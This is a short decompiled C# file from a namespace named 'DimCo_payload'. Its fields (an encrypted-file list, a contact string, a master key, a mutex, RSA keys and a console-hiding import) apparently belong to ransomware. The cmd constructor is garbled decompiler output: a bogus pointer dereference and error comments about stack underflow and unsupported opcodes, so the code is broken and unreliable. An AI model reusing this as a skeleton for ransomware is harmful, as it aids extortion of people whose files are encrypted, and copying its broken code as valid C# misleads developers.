using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using DimCo_payload.Encryption;

namespace DimCo_payload;

internal class global
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public unsafe cmd(string name, string args)
		{
			long num = *(long*)4;
			/*OpCode not supported: DebugBreak*/;
			checked
			{
				_ = (nuint)num;
				/*Error near IL_0008: stloc 0 (out-of-bounds)*/;
				switch (/*Error near IL_000e: Stack underflow*/)
				{
				default:
					;
					break;
				}
				/*Error: Unexpected end of block*/;
			}
		}
	}

	public static List<string> encrypted;

	public static string contact;

	public static string masterkey;

	public static string mutex;

	public static bool isDencrypted;

	public static DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys Keys;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public extern global();
}
